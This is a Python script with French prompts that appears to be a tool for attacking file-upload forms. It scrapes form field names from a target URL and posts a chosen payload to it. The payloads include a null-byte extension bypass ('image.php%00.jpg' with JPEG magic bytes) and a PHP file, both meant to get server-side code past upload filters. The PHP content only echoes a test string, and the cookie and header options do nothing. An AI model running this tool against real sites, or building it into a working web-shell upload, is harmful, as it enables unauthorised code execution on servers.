import requests
import time
import base64
import argparse
import re

# ============== PAYLOAD ============== #
Main_payload = r"""
__/\\\\____________/\\\\_______________________________________________________________        
 _\/\\\\\\________/\\\\\\_______________________________________________________________       
  _\/\\\//\\\____/\\\//\\\_____________________________________/\\\______________________      
   _\/\\\\///\\\/\\\/_\/\\\___/\\\\\\\\\______/\\/\\\\\\_____/\\\\\\\\\\\___/\\\\\\\\\____     
    _\/\\\__\///\\\/___\/\\\__\////////\\\____\/\\\////\\\___\////\\\////___\////////\\\___    
     _\/\\\____\///_____\/\\\____/\\\\\\\\\\___\/\\\__\//\\\_____\/\\\_________/\\\\\\\\\\__   
      _\/\\\_____________\/\\\___/\\\/////\\\___\/\\\___\/\\\_____\/\\\_/\\____/\\\/////\\\__  
       _\/\\\_____________\/\\\__\//\\\\\\\\/\\__\/\\\___\/\\\_____\//\\\\\____\//\\\\\\\\/\\_ 
        _\///______________\///____\////////\//___\///____\///_______\/////______\////////\//__"""

Exit_payload = r"""
_____/\\\\\\\\\\\\_____________________________________/\\\_____________/\\\_____________________________________        
 ___/\\\//////////_____________________________________\/\\\____________\/\\\_____________________________________       
  __/\\\________________________________________________\/\\\____________\/\\\___________/\\\__/\\\________________      
   _\/\\\____/\\\\\\\_____/\\\\\________/\\\\\___________\/\\\____________\/\\\__________\//\\\/\\\______/\\\\\\\\__     
    _\/\\\___\/////\\\___/\\\///\\\____/\\\///\\\____/\\\\\\\\\____________\/\\\\\\\\\_____\//\\\\\_____/\\\/////\\\_    
     _\/\\\_______\/\\\__/\\\__\//\\\__/\\\__\//\\\__/\\\////\\\____________\/\\\////\\\_____\//\\\_____/\\\\\\\\\\\__   
      _\/\\\_______\/\\\_\//\\\__/\\\__\//\\\__/\\\__\/\\\__\/\\\____________\/\\\__\/\\\__/\\_/\\\_____\//\\///////___  
       _\//\\\\\\\\\\\\/___\///\\\\\/____\///\\\\\/___\//\\\\\\\/\\___________\/\\\\\\\\\__\//\\\\/_______\//\\\\\\\\\\_ 
        __\////////////_______\/////________\/////______\///////\//____________\/////////____\////__________\//////////__"""
# ============== PAYLOAD ============== #



parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', dest='url', default=None, help='Url to exploit')
parser.add_argument('-c', '--cookie', dest='cookie', default=None, help='Delicious cookie')
parser.add_argument('-H', '--header', dest='header', default=None, help='Header for the post request')
parser.add_argument('-b', '--body', dest='body', default=None, help='Body if needed')
args = parser.parse_args()


def extract_names(html):
    forms = re.findall(r"<form[\s\S]*?</form>", html, flags=re.IGNORECASE)
    names = set()

    for form in forms:
        names.update(re.findall(r'name=["\']([^"\']+)["\']', form, flags=re.IGNORECASE))
        names.update(re.findall(r'name=([^"\'>\s]+)', form, flags=re.IGNORECASE))

    return list(names)


def upload_file(url, field_name, payload):
    files = {}

    content = payload["content"]
    if isinstance(content, str):
        content = content.encode()

    files[field_name] = (
        payload["file_name"],
        content,
        payload["mime"]
    )

    response = requests.post(url, files=files, data={"submit": "OK"})
    return response


payloads = {
    0: {
        "file_name": "sample.txt",
        "mime": "text/plain",
        "content": "Ceci est un test."
    },
    1: {
        "file_name": "image.php%00.jpg",
        "mime": "image/jpeg",
        "content": b"\xff\xd8\xff\xe0"
    },
    2: {
        "file_name": "image.php",
        "mime": "application/php",
        "content": "<?php echo 'ok'; ?>"
    }
}

if args.cookie:
    print("ok")
if args.header:
    print("ok")


if args.url:
    print(f"[+] Target : {args.url}")

    html = requests.get(args.url).text
    variables = extract_names(html)

    if len(variables) == 0:
        print("[!] Aucun champ trouvé")
        exit()
    elif len(variables) == 1:
        field_name = variables[0]
        print(f"\n[+] Champs trouvé :\n[0] {field_name}")
    else:
        for idx, var in enumerate(variables):
            print(f"[{idx}] {var}")

        var_index = int(input("\nChoisis le numéro du champ d’upload : "))
        field_name = variables[var_index]

    if field_name:
        print("\n[+] Payloads disponibles :")
        for idx in payloads:
            print(f"[{idx}] {payloads[idx]['file_name']}")

        payload_index = int(input("\nChoisis le numéro du payload : "))
        payload = payloads[payload_index]

        print(f"\n[+] Upload sur le champ '{field_name}' avec '{payload['file_name']}'")

        upload_response = upload_file(args.url, field_name, payload)

        print("\n[+] Réponse upload :")
        print(upload_response.text)

else:
    print("[!] Tu dois spécifier une URL (-u ou --url)")
